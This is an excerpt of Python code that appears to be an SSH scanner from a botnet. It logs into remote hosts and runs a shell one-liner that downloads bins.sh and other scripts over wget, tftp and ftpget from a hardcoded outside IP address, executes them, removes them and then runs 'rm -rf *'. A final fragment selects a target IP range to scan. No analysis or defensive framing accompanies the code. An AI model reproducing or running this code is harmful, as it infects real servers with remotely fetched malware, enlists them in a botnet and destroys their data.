...
def sshscanner(ip):
    ...
    try:
        ...
        if badserver == False:
                ...
                ssh.exec_command("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.172.110.220/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.172.110.220 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.172.110.220; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.172.110.220 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *")
...
if sys.argv[2] == "LUCKY":
    ranges = ["188.16.0.0/188.18.255.255"] 
